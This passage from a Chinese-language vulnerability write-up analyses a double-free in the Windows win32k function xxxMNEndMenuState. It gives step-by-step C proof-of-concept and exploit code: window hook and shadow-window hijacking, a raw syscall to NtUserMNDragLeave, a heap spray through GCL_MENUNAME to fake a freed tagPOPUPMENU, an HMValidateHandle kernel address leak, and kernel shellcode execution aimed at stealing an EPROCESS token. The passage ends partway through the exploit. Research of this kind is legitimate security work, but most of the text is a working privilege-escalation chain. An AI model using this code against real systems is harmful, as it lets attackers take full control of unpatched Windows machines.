聚焦 `uButtonDownHitArea` 成员域，该成员域存储当前鼠标按下的坐标区域所属的窗口对象地址，当鼠标按键抬起时系统解锁并置零该成员域。因此，需要在系统处理鼠标按下消息期间，用户进程发起菜单终止的操作，以使执行流进入函数 `xxxMNEndMenuState` 并执行到解锁成员域 `uButtonDownHitArea` 的位置时，该成员域中存储合法的窗口对象的地址。

系统在销毁该窗口对象期间，会同时销毁与该窗口对象关联的阴影窗口对象。阴影窗口对象不带有专门的窗口消息处理函数，因此可以在用户进程中将窗口对象的消息处理函数成员域篡改为由用户进程自定义的消息处理函数，在自定义函数中，再次触发菜单终止的任务，致使漏洞成功触发。

## 0x3 触发

接下来通过构造验证代码在系统调用 `xxxMNEndMenuState` 函数释放根弹出菜单对象之后并在重置当前线程信息对象的成员域 `pMenuState` 之前，使线程的执行流再次进入 `xxxMNEndMenuState` 函数调用，致使触发对目标成员域 `pGlobalPopupMenu` 指向对象的重复释放。

在用户进程中首先为验证代码创建单独的线程，利用代码的主体任务都在新线程的上下文中执行。在原有的主线程中监听全局变量 `bDoneExploit` 是否被赋值以等待下一步操作。

---

**验证代码主函数**

验证代码首先通过调用 `CreatePopupMenu` 等函数创建两个非模态的可弹出的菜单对象。由于模态的菜单将导致线程在内核中进入函数 `xxxMNLoop` 的循环等待状态，导致无法在同一线程中执行其他操作，对漏洞触发造成难度，因此我们选择非模态的菜单类型。这里的可弹出的菜单对象不是前面提到的 `tagPOPUPMENU` 类型的对象，而是带有 `MFISPOPUP` 标志位状态的 `tagMENU` 对象。结构体 `tagMENU` 是菜单对象的实体，而 `tagPOPUPMENU` 是用来描述菜单对象实体的弹出状态的对象，在菜单对象实际弹出时创建、菜单对象结束弹出状态时销毁，需要注意两者的区别。

接下来通过 `AppendMenuA` 为两个菜单添加菜单项，并使第二个成为第一个的子菜单。

```
LPCSTR szMenuItem = "item";
MENUINFO mi = { 0 };
mi.cbSize  = sizeof(mi);
mi.fMask   = MIM_STYLE;
mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;

hpopupMenu[0] = CreatePopupMenu();
hpopupMenu[1] = CreatePopupMenu();
SetMenuInfo(hpopupMenu[0], &mi);
SetMenuInfo(hpopupMenu[1], &mi);
AppendMenuA(hpopupMenu[0], MF_BYPOSITION | MF_POPUP, (UINT_PTR)hpopupMenu[1], szMenuItem);
AppendMenuA(hpopupMenu[1], MF_BYPOSITION | MF_POPUP, 0, szMenuItem);
```

*创建并关联两个菜单对象的验证代码*

接下来创建一个普通的窗口对象 `hWindowMain` 以在后续菜单弹出时作为弹出菜单的拥有者窗口对象。如果编译时选择 GUI 界面程序，则获取默认的窗口对象句柄即可，这一步就不需要创建额外的窗口对象了。

```
WNDCLASSEXW wndClass = { 0 };
wndClass = { 0 };
wndClass.cbSize = sizeof(WNDCLASSEXW);
wndClass.lpfnWndProc    = DefWindowProcW;
wndClass.cbWndExtra     = 0;
wndClass.hInstance      = GetModuleHandleA(NULL);
wndClass.lpszMenuName   = NULL;
wndClass.lpszClassName  = L"WNDCLASSMAIN";
RegisterClassExW(&wndClass);
hWindowMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
    L"WNDCLASSMAIN",
    NULL,
    WS_VISIBLE,
    0,
    0,
    1,
    1,
    NULL,
    NULL,
    GetModuleHandleA(NULL),
    NULL);
```

*创建用来拥有弹出菜单的主窗口对象的验证代码*

通过函数 `SetWindowsHookExW` 创建类型为 `WH_CALLWNDPROC` 关联当前线程的挂钩程序，并通过 `SetWinEventHook` 创建范围包含 `EVENT_SYSTEM_MENUPOPUPSTART` 的关联当前进程和线程的事件通知消息处理程序。前面已经提到，设置 `WH_CALLWNDPROC` 类型的挂钩程序会在每次线程将消息发送给窗口对象之前调用。事件通知 `EVENT_SYSTEM_MENUPOPUPSTART` 表示目标弹出菜单已被显示在屏幕上。

```
SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
    GetModuleHandleA(NULL),
    GetCurrentThreadId());
SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
    GetModuleHandleA(NULL),
    xxWindowEventProc,
    GetCurrentProcessId(),
    GetCurrentThreadId(),
    0);
```

*创建消息挂钩和事件通知程序的验证代码*

验证代码调用函数 `TrackPopupMenuEx` 使第一个菜单作为根菜单在创建的窗口中弹出。

```
TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);
```

*调用函数 TrackPopupMenuEx 的验证代码*

接着通过调用 `GetMessage` 和 `DispatchMessage` 等函数在当前线程中实现消息循环。

```
MSG msg = { 0 };
while (GetMessageW(&msg, NULL, 0, 0))
{
    TranslateMessage(&msg);
    DispatchMessageW(&msg);
}
```

*实现消息循环的验证代码*

在用户进程中验证代码调用函数 `TrackPopupMenuEx` 使执行流在内核中进入 `xxxTrackPopupMenuEx` 函数。

![]()
*验证代码主函数执行逻辑*

---

**自定义挂钩处理函数**

在函数 `TrackPopupMenuEx` 执行期间，系统调用函数 `xxxCreateWindowEx` 创建新的菜单类型的窗口对象。就像前面的章节提到的那样，创建窗口对象成功时，函数向该窗口对象发送 `WM_NCCREATE` 消息。在函数 `xxxSendMessageTimeout` 调用对象指定的消息处理程序之前，还会调用 `xxxCallHook` 函数用来调用先前由用户进程设定的 `WH_CALLWNDPROC` 类型的挂钩处理程序。这时执行流会回到我们先前在验证代码中定义的挂钩处理函数中。

在自定义挂钩处理函数 `xxWindowHookProc` 中，我们根据参数 `lParam` 指向 `tagCWPSTRUCT` 对象的成员域 `message` 判断当前处理的消息是否为 `WM_NCCREATE` 消息，不是的情况则直接忽略。接下来根据窗口句柄获取窗口对象的类名称，当类名称为 `#32768` 时，表示这是创建的菜单窗口对象，因此将该句柄记录下来以备后续引用。

```
LRESULT CALLBACK
xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
    tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
    static HWND hwndMenuHit = 0;
    if (cwp->message != WM_NCCREATE)
    {
        return CallNextHookEx(0, code, wParam, lParam);
    }
    WCHAR szTemp[0x20] = { 0 };
    GetClassNameW(cwp->hwnd, szTemp, 0x14);
    if (!wcscmp(szTemp, L"#32768"))
    {
        hwndMenuHit = cwp->hwnd;
    }
    return CallNextHookEx(0, code, wParam, lParam);
}
```

*在挂钩处理程序中记录 #32768 窗口的句柄*

在目标菜单窗口对象创建完成时，系统在内核中设置窗口对象的位置坐标并使其显示在屏幕上。在这期间，系统为该窗口对象创建关联的类型为 `SysShadow` 的阴影窗口对象。同样地，创建阴影窗口对象并发送 `WM_NCCREATE` 消息时，系统也会调用 `xxxCallHook` 函数来分发调用挂钩程序。

前面章节的“终止菜单”部分的分析已知，在函数 `xxxEndMenuLoop` 调用期间，系统对每个弹出菜单窗口对象都调用了两次 `xxxRemoveShadow` 函数。这将导致在到达漏洞触发位置之前阴影窗口被提前取消关联和销毁。**因此我们要想办法为成员域 `uButtonDownHitArea` 存储的目标菜单窗口对象创建并关联至少 3 个阴影窗口对象。**

回到验证代码的自定义挂钩处理函数中，在判断窗口类名称的位置增加判断是否为 `SysShadow` 的情况。如果命中这种情况，我们通过调用函数 `SetWindowPos` 对先前保存句柄指向的类名称为 `#32768` 的窗口对象依次设置 `SWP_HIDEWINDOW` 和 `SWP_SHOWWINDOW` 状态标志，使窗口先隐藏后显示，再次触发内核中添加阴影窗口关联的逻辑以创建新的阴影窗口对象。

在执行流进入自定义挂钩处理函数的 `SysShadow` 处理逻辑时，在内核中正处于创建阴影窗口的 `xxxCreateWindowEx` 执行期间，此时创建的阴影窗口对象和原菜单窗口对象还没有关联起来，它们的关联关系尚未被插入 `gpShadowFirst` 链表中。此时对目标菜单对象调用 `SetWindowPos` 以设置 `SWP_SHOWWINDOW` 状态标志，将导致系统对目标菜单窗口创建并关联多个阴影窗口对象，后创建的阴影窗口对象将被先插入 `gpShadowFirst` 链表中，从而位于链表中更靠后的位置。

![]()
*多阴影窗口关联的插入链表和位置顺序逻辑*

在自定义挂钩处理函数的 `SysShadow` 处理逻辑中，对进入次数进行计数，对前 2 次进入的情况调用函数 `SetWindowPos` 以触发创建新的阴影窗口关联的逻辑；到第 3 次进入的情况时，我们通过调用函数 `SetWindowLong` 将目标阴影窗口对象的消息处理函数篡改为自定义的阴影窗口消息处理函数。

```
if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
{
    if (++iShadowCount == 3)
    {
        SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
    }
    else
    {
        SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
        SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
    }
}
```

*对目标菜单窗口对象创建多阴影窗口关联的验证代码*

一切处理妥当后，需设置相关的全局标志以阻止执行流重复进入该自定义挂钩处理函数致使上面的逻辑代码被多次执行。

![]()
*创建多个阴影窗口对象的执行逻辑*

---

**自定义事件通知处理函数**

在内核函数 `xxxTrackPopupMenuEx` 中处理完成对根弹出菜单窗口对象的创建时，系统调用 `xxxWindowEvent` 函数以发送代表“菜单弹出开始”的 `EVENT_SYSTEM_MENUPOPUPSTART` 事件通知。这将进入我们先前设置的自定义事件通知处理函数 `xxWindowEventProc` 中。每当进入该事件通知处理程序时，代表当前新的弹出菜单已显示在屏幕中。

在验证代码的自定义事件通知处理函数 `xxWindowEventProc` 中进行计数，当第 1 次进入函数时，表示根弹出菜单已在屏幕中显示，因此通过调用函数 `SendMessage` 向参数句柄 `hwnd` 指向的菜单窗口对象发送 `WM_LBUTTONDOWN` 鼠标左键按下的消息，并在参数 `lParam` 传入按下的相对坐标。在 32 位系统中，参数 `lParam` 是一个 `DWORD` 类型的数值，其高低 16 位分别代表横坐标和纵坐标的相对位置，传入的数值需要确保相对坐标位于先前创建菜单时设定的子菜单项的位置。参数 `wParam` 设定用户按下的是左键还是右键，设置为 `1` 表示 `MK_LBUTTON` 左键。

在内核中消息处理函数 `xxxMenuWindowProc` 接收并处理该消息，这将导致最终调用到函数 `xxxMNOpenHierarchy` 以创建新弹出的子菜单的相关对象。类似地，在处理完成新的子菜单在屏幕中的显示时，函数 `xxxMNOpenHierarchy` 调用函数 `xxxWindowEvent` 发送 `EVENT_SYSTEM_MENUPOPUPSTART` 事件通知。这使得执行流再次进入自定义事件通知处理函数 `xxWindowEventProc` 中。

当第 2 次进入函数 `xxWindowEventProc` 时，表示弹出的子菜单已在屏幕中显示。此时验证代码调用函数 `SendMessage` 向目标子菜单窗口对象发送 `MN_ENDMENU` 菜单终止的消息，这将导致执行流最终进入内核函数 `xxxMNEndMenuState` 中。

```
VOID CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,
    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    if (++iMenuCreated >= 2)
    {
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else
    {
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)
    }
}
```

*事件通知处理函数发送消息的验证代码*

执行流进入函数 `xxxMNEndMenuState` 时，线程关联的菜单状态对象成员域 `uButtonDownHitArea` 存储最后处理鼠标按下消息时按下坐标位于的窗口对象（即在先前被创建并关联了 3 个阴影窗口对象的菜单窗口对象）的指针。位于 `gShadowFirst` 链表中与该菜单窗口对象关联的最开始的两个阴影窗口已在函数 `xxxEndMenuLoop` 执行期间被解除关联并销毁，此时链表中仍存在与该菜单窗口对象关联的最后 1 个阴影窗口关联节点，该阴影窗口对象就是当时被篡改了消息处理函数的阴影窗口对象。

函数在 `MNFreePopup` 中释放当前根弹出菜单对象之后调用函数 `UnlockMFMWFPWindow` 以解锁成员域 `uButtonDownHitArea` 存储的目标菜单窗口对象时，不出意外的话，此时该菜单窗口对象的锁计数归零，因此窗口管理器将调用销毁函数 `xxxDestroyWindow` 以执行销毁任务。这将解除关联并销毁第 3 个关联的阴影窗口对象，并使执行流进入先前篡改的自定义消息处理函数中。

---

**阴影窗口自定义消息处理函数**

在验证代码的阴影窗口自定义消息处理函数 `xxShadowWindowProc` 中，判断消息参数是否为 `WM_NCDESTROY` 类型。如果是的话，则在此直接调用 `NtUserMNDragLeave` 系统服务。

```
ULONG_PTR
xxSyscall(UINT num, ULONG_PTR param1, ULONG_PTR param2)
{
    __asm { mov eax, num };
    __asm { int 2eh };
}

CONST UINT num_NtUserMNDragLeave = 0x11EC;

LRESULT WINAPI
xxShadowWindowProc(
    _In_ HWND   hwnd,
    _In_ UINT   msg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    if (msg == WM_NCDESTROY)
    {
        xxSyscall(num_NtUserMNDragLeave, 0, 0);
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}
```

*阴影窗口自定义消息处理函数的验证代码*

函数 `NtUserMNDragLeave` 原本用于结束菜单的拖拽状态。在该函数执行期间，系统在进行一系列的判断和调用之后，最终在函数 `xxxUnlockMenuState` 中调用 `xxxMNEndMenuState` 函数：

```
  bZeroLock = menuState->dwLockCount-- == 1;
  if ( bZeroLock && ExitMenuLoop(menuState, menuState->pGlobalPopupMenu) )
  {
    xxxMNEndMenuState(1);
    result = 1;
  }
```

*函数 xxxUnlockMenuState 调用 xxxMNEndMenuState 函数*

这导致重新触达漏洞所在的位置并致使菜单状态对象的成员域 `pGlobalPopupMenu` 指向的根弹出菜单对象被重复释放，导致系统 BSOD 的发生。

![]()
*根弹出菜单对象重复释放导致系统 BSOD 的发生*

## 0x4 利用

前面的章节对漏洞原理进行分析并构造了简单的漏洞触发验证代码。在本章节中将利用该漏洞的触发，通过循序渐进的方式构造利用代码，最终实现利用和提权的目的。

---

**初始化利用数据**

在利用代码中自定义结构体 `SHELLCODE` 以存储与利用相关的数据：

```
typedef struct _SHELLCODE {
    DWORD reserved;
    DWORD pid;
    DWORD off_CLS_lpszMenuName;
    DWORD off_THREADINFO_ppi;
    DWORD off_EPROCESS_ActiveLink;
    DWORD off_EPROCESS_Token;
    PVOID tagCLS[0x100];
    BYTE  pfnWindProc[];
} SHELLCODE, *PSHELLCODE;
```

*自定义的 SHELLCODE 结构体定义*

在利用代码的早期阶段在用户进程中分配完整内存页的 `RWX` 内存块，并初始化相关成员域，将 ShellCode 函数代码拷贝到从成员域 `pfnWindProc` 起始的内存地址。

```
pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (pvShellCode == NULL)
{
    return 0;
}
ZeroMemory(pvShellCode, 0x1000);
pvShellCode->pid = GetCurrentProcessId();
pvShellCode->off_CLS_lpszMenuName    = 0x050;
pvShellCode->off_THREADINFO_ppi      = 0x0b8;
pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
pvShellCode->off_EPROCESS_Token      = 0x0f8;
CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));
```

*初始化分配的 SHELLCODE 结构体内存区域*

成员域 `pfnWindProc` 起始的内存区域将最终作为实际 ShellCode 函数代码在内核上下文执行。

---

**伪造根弹出菜单对象**

在用户进程验证代码的阴影窗口自定义消息处理函数 `xxShadowWindowProc` 执行期间，需要通过相关函数在内核中分配与 `tagPOPUPMENU` 结构体相同大小的缓冲区以占位刚释放的内存空隙，伪造新的弹出菜单对象，使系统误认为弹出菜单对象仍旧正常存在于内核中。

这在利用代码中将通过调用函数 `SetClassLong` 对大量的窗口对象设置 `MENUNAME` 字段的方式实现。这些窗口对象需要在首次调用函数 `TrackPopupMenuEx` 之前完成创建和初始化。

回到验证代码调用函数 `TrackPopupMenuEx` 之前创建菜单对象的位置，在此时机增加调用函数 `CreateWindowEx` 以创建大量窗口对象，并为每个窗口对象注册单独的窗口类。

```
for (INT i = 0; i < 0x100; ++i)
{
    WNDCLASSEXW Class = { 0 };
    WCHAR szTemp[20] = { 0 };
    HWND hwnd = NULL;
    wsprintfW(szTemp, L"%x-%d", rand(), i);
    Class.cbSize        = sizeof(WNDCLASSEXW);
    Class.lpfnWndProc   = DefWindowProcW;
    Class.cbWndExtra    = 0;
    Class.hInstance     = GetModuleHandleA(NULL);
    Class.lpszMenuName  = NULL;
    Class.lpszClassName = szTemp;
    RegisterClassExW(&Class);
    hwnd = CreateWindowExW(0, szTemp, NULL, WS_OVERLAPPED,
        0,
        0,
        0,
        0,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
    hWindowList[iWindowCount++] = hwnd;
}
```

*创建大量普通窗口对象的利用代码*

接下来在验证代码的自定义阴影窗口消息处理函数 `xxShadowWindowProc` 中调用系统服务 `NtUserMNDragLeave` 之前，增加对前面批量创建的普通窗口对象设置 `GCL_MENUNAME` 的调用：

```
DWORD dwPopupFake[0xD] = { 0 };
dwPopupFake[0x0] = 0x00098208;  //->flags
dwPopupFake[0x1] = 0xDDDDDDDD;  //->spwndNotify
dwPopupFake[0x2] = 0xDDDDDDDD;  //->spwndPopupMenu
dwPopupFake[0x3] = 0xDDDDDDDD;  //->spwndNextPopup
dwPopupFake[0x4] = 0xDDDDDDDD;  //->spwndPrevPopup
dwPopupFake[0x5] = 0xDDDDDDDD;  //->spmenu
dwPopupFake[0x6] = 0xDDDDDDDD;  //->spmenuAlternate
dwPopupFake[0x7] = 0xDDDDDDDD;  //->spwndActivePopup
dwPopupFake[0x8] = 0xDDDDDDDD;  //->ppopupmenuRoot
dwPopupFake[0x9] = 0xDDDDDDDD;  //->ppmDelayedFree
dwPopupFake[0xA] = 0xDDDDDDDD;  //->posSelectedItem
dwPopupFake[0xB] = 0xDDDDDDDD;  //->posDropped
dwPopupFake[0xC] = 0;
for (UINT i = 0; i < iWindowCount; ++i)
{
    SetClassLongW(hWindowList[i], GCL_MENUNAME, (LONG)dwPopupFake);
}
```

*为普通窗口对象设置 MENUNAME 字段的利用代码*

由于 `MENUNAME` 字段属于 `WCHAR` 字符串格式，因此在初始化缓冲区时需要将所有数值设置为不包含连续 2 字节为 `0` 的情况。通过调用函数 `SetClassLongW` 为目标窗口对象设置 `MENUNAME` 字段时，系统最终在内核中为窗口对象所属的窗口类 `tagCLS` 对象的成员域 `lpszMenuName` 分配并设置 `UNICODE` 字符串缓冲区。

由于成员域 `lpszMenuName` 指向的缓冲区和弹出菜单 `tagPOPUPMENU` 对象的缓冲区同样是进程配额的内存块，因此两者所占用的额外内存大小相同，只需要将在利用代码中为每个窗口对象设置的 `MENUNAME` 缓冲区长度设置为与 `tagPOPUPMENU` 大小相同的长度，那么通常情况下在内核中总有一个窗口对象的 `MENUNAME` 缓冲区被分配在先前释放的根弹出菜单对象的内存区域中，成为伪造的根弹出菜单 `tagPOPUPMENU` 对象。

![]()
*通过设置 GCL\_MENUNAME 占用原根弹出菜单对象内存区域*

为使在稍后位置调用的系统服务 `NtUserMNDragLeave` 能依据伪造的根弹出菜单对象再次进入函数 `xxxMNEndMenuState` 调用，需要将伪造对象的成员域 `flags` 进行稍微设置，将关键标志位置位，其余标志位置零。

```
kd> dt win32k!tagPOPUPMENU 0141fb44
   [...]
   +0x000 fIsTrackPopup    : 0y1
   [...]
   +0x000 fFirstClick      : 0y1
   [...]
   +0x000 fDestroyed       : 0y1
   +0x000 fDelayedFree     : 0y1
   [...]
   +0x000 fInCancel        : 0y1
   [...]
   +0x004 spwndNotify      : 0xdddddddd tagWND
   +0x008 spwndPopupMenu   : 0xdddddddd tagWND
   +0x00c spwndNextPopup   : 0xdddddddd tagWND
   +0x010 spwndPrevPopup   : 0xdddddddd tagWND
   +0x014 spmenu           : 0xdddddddd tagMENU
   +0x018 spmenuAlternate  : 0xdddddddd tagMENU
   +0x01c spwndActivePopup : 0xdddddddd tagWND
   +0x020 ppopupmenuRoot   : 0xdddddddd tagPOPUPMENU
   +0x024 ppmDelayedFree   : 0xdddddddd tagPOPUPMENU
   +0x028 posSelectedItem  : 0xdddddddd
   +0x02c posDropped       : 0xdddddddd
```

*伪造的 tagPOPUPMENU 对象的成员域数据*

---

**伪造弹出菜单对象成员域**

前面伪造的 `tagPOPUPMENU` 对象重新占用了先前释放的根弹出菜单对象的内存区域，并且其各个成员域在利用代码中分配时可以实施完全控制。但前面并未对其各个指针成员域进行有效性设置，这样一来在函数 `xxxMNEndMenuState` 中解锁各个指针成员域指向的对象时仍旧会触发缺页异常等错误。接下来通过对指针成员域进行设置，使其指向有效的内存空间，以使内核逻辑能够正常向后执行。

回到验证代码中创建作为弹出菜单拥有者的窗口对象 `hWindowMain` 的位置，增加创建新的用作利用载体的普通窗口对象 `hWindowHunt` 的代码：

```
WNDCLASSEXW wndClass = { 0 };
wndClass = { 0 };
wndClass.cbSize = sizeof(WNDCLASSEXW);
wndClass.lpfnWndProc    = DefWindowProcW;
wndClass.cbWndExtra     = 0x200;
wndClass.hInstance      = GetModuleHandleA(NULL);
wndClass.lpszMenuName   = NULL;
wndClass.lpszClassName  = L"WNDCLASSHUNT";
RegisterClassExW(&wndClass);
hWindowHunt = CreateWindowExW(0x00,
    L"WNDCLASSHUNT",
    NULL,
    WS_OVERLAPPED,
    0,
    0,
    1,
    1,
    NULL,
    NULL,
    GetModuleHandleA(NULL),
    NULL);
```

*创建用来作为利用载体的窗口对象的利用代码*

载体窗口对象 `hWindowHunt` 具有 `0x200` 字节大小的扩展区域，扩展区域紧随基础的 `tagWND` 对象其后，在利用代码中将用来伪造各种相关的内核用户对象，以使系统重新执行 `xxxMNEndMenuState` 期间，执行流能正常稳定地执行。

接下来通过 `HMValidateHandle` 内核对象地址泄露技术获取载体窗口对象的 `tagWND` 内核地址。窗口对象 `tagWND` 的头部结构是一个 `THRDESKHEAD` 成员结构体对象，完整的结构体定义如下：

```
kd> dt win32k!_THRDESKHEAD
   +0x000 h                : Ptr32 Void
   +0x004 cLockObj         : Uint4B
   +0x008 pti              : Ptr32 tagTHREADINFO
   +0x00c rpdesk           : Ptr32 tagDESKTOP
   +0x010 pSelf            : Ptr32 UChar
```

*结构体 THRDESKHEAD 的定义*

其中成员域 `pSelf` 指向所属用户对象的内核首地址。因此通过该指针加上 `tagWND` 结构体的大小定位到当前窗口对象的扩展区域的内核地址。

根据代码分析，函数 `xxxMNEndMenuState` 在执行的初始阶段调用函数 `MNEndMenuStateNotify` 用来在通知窗口对象所属线程和当前菜单状态所属线程不同的情况下，清理通知线程的线程信息对象的成员域 `pMenuState` 数值。然而不幸的是，由于伪造的 `tagPOPUPMENU` 对象已覆盖原有数据，因此需要继续伪造包括通知窗口对象在内的其他内核用户对象。

```
PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hWindowHunt);
PBYTE pbExtra = head->deskhead.pSelf + 0xb0 + 4;
pvHeadFake = pbExtra + 0x44;
for (UINT x = 0; x < 0x7F; x++) // 0x04~0x1FC
{
    SetWindowLongW(hWindowHunt, sizeof(DWORD) * (x + 1), (LONG)pbExtra);
}
PVOID pti = head->thread.pti;
SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti
```

*填充载体窗口对象扩展区域的利用代码*

将载体窗口对象的扩展区域预留 `4` 字节，将剩余 `0x1FC` 字节的内存区域全部填充为扩展区域 `+0x04` 字节偏移的地址，填充的数值将作为各种伪造对象的句柄、引用计数或对象指针成员域。

接下来将剩余内存区域 `+0x44` 字节偏移的内存数据作为伪造的内核用户对象头部结构，其地址被作为伪造的根弹出菜单 `tagPOPUPMENU` 对象的各个指针成员域的值。在利用代码的自定义阴影窗口消息处理函数 `xxxShadowWindowProc` 中替换原来的初始化 `MENUNAME` 字段缓冲区的利用代码：

```
DWORD dwPopupFake[0xD] = { 0 };
dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
dwPopupFake[0x4] = (DWORD)pvHeadFake;  //->spwndPrevPopup
dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
dwPopupFake[0xC] = (DWORD)0;
```

*更新的初始化 MENUNAME 缓冲区的利用代码*

其中例外的成员域 `ppopupmenuRoot` 和 `posSelectedItem` 被填充为 `0xFFFFFFFF` 以防止执行流误入歧途。由于伪造对象头部 `pvHeadFake` 指向的内存区域对应的成员域 `cLockObj` 具有极大的数值，因此在内核中各个针对该伪造对象的解锁和解引用函数调用都不足以使系统为其调用销毁对象的函数，因此异常将不会发生。

在函数 `xxxMNEndMenuState` 第二次执行期间，在原位置重新分配的伪造根弹出菜单 `tagPOPUPMENU` 对象在函数 `MNFreePopup` 中释放。

---

**内核地址泄露技术**

本分析中使用了 `HMValidateHandle` 内核地址泄露技术。在 `user32` 模块中，在操作一些用户对象时，为了提升效率以便于直接在用户模式获取目标用户对象的数据，系统提供了未导出的函数 `HMValidateHandle` 以供模块内部使用。

这个函数接收用户句柄和对象类型作为参数，在内部对参数进行验证，验证通过时则返回目标对象在当前进程桌面堆中映射的地址。该函数并未导出，但在一些导出函数中调用，例如 `IsMenu` 函数。该函数验证通过参数传入的句柄是否为菜单句柄。函数通过将句柄值和菜单类型枚举 `2`(`TYPE_MENU`) 传入函数 `HMValidateHandle` 调用，并判断函数返回值是否不为空，并返回判断的结果。

```
.text:76D76F0E 8B FF          mov     edi, edi
.text:76D76F10 55             push    ebp
.text:76D76F11 8B EC          mov     ebp, esp
.text:76D76F13 8B 4D 08       mov     ecx, [ebp+hMenu]
.text:76D76F16 B2 02          mov     dl, 2
.text:76D76F18 E8 73 5B FE FF call    @HMValidateHandle@8 ; HMValidateHandle(x,x)
.text:76D76F1D F7 D8          neg     eax
.text:76D76F1F 1B C0          sbb     eax, eax
.text:76D76F21 F7 D8          neg     eax
.text:76D76F23 5D             pop     ebp
.text:76D76F24 C2 04 00       retn    4
```

*函数 IsMenu 的指令片段*

因此我们可以通过硬编码匹配的方式，从 `user32` 模块的导出函数 `IsMenu` 中查找并计算函数 `HMValidateHandle` 的地址。

```
static PVOID(__fastcall *pfnHMValidateHandle)(HANDLE, BYTE) = NULL;
VOID
xxGetHMValidateHandle(VOID)
{
    HMODULE hModule = LoadLibraryA("USER32.DLL");
    PBYTE pfnIsMenu = (PBYTE)GetProcAddress(hModule, "IsMenu");
    PBYTE Address = NULL;
    for (INT i = 0; i < 0x30; i++)
    {
        if (*(WORD *)(i + pfnIsMenu) != 0x02B2)
        {
            continue;
        }
        i += 2;
        if (*(BYTE *)(i + pfnIsMenu) != 0xE8)
        {
            continue;
        }
        Address = *(DWORD *)(i + pfnIsMenu + 1) + pfnIsMenu;
        Address = Address + i + 5;
        pfnHMValidateHandle = (PVOID(__fastcall *)(HANDLE, BYTE))Address;
        break;
    }
}
```

*查找并计算 HMValidateHandle 函数地址的利用代码*

目标函数查找到之后，在利用代码中需要获取窗口对象等类型用户对象的地址的时机调用该函数并传入对象句柄，调用成功时则返回目标对象在用户进程桌面堆中的映射地址。

```
#define TYPE_WINDOW 1
PVOID
xxHMValidateHandleEx(HWND hwnd)
{
    return pfnHMValidateHandle((HANDLE)hwnd, TYPE_WINDOW);
}
```

*获取目标窗口对象在桌面堆中的映射地址的利用代码*

窗口对象的头部结构是一个 `THRDESKHEAD` 成员结构体对象，其中存在子成员域 `pSelf` 指向所属窗口对象的内核首地址。

---

**内核模式代码执行**

成员标志位 `bServerSideWindowProc` 位于 `tagWND` 对象标志成员域的第 `18` 比特位，其之前的两个标志位是 `bDialogWindow` 和 `bHasCreatestructName` 标志位：

```
kd> dt win32k!tagWND
   +0x000 head             : _THRDESKHEAD
   +0x014 state            : Uint4B
   [...]
   +0x014 bDialogWindow    : Pos 16, 1 Bit
   +0x014 bHasCreatestructName : Pos 17, 1 Bit
   +0x014 bServerSideWindowProc : Pos 18, 1 Bit
```

标志位 `bDialogWindow` 的位置是 `bServerSideWindowProc` 所在字节的起始比特位。通过研究发现，在创建普通窗口对象时，如果样式参数 `dwStyle` 和扩展样式参数 `dwExStyle` 都传值为 `0` 默认值，那么在内核中成员域 `bDialogWindow` 和 `bHasCreatestructName` 都将未被置位。因此可以借助这个特性，实现对目标关键标志位的置位。

在利用代码中填充载体窗口对象的扩展区域内存期间，增加通过内核地址泄露技术获取窗口对象成员域 `bDialogWindow` 的地址的调用：

```
pvAddrFlags = *(PBYTE *)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;
```

接着将先前初始化的结构体 `SHELLCODE` 对象的成员域 `pfnWindProc` 起始地址设置为载体窗口对象 `hWindowHunt` 的消息处理函数：

```
SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);
```

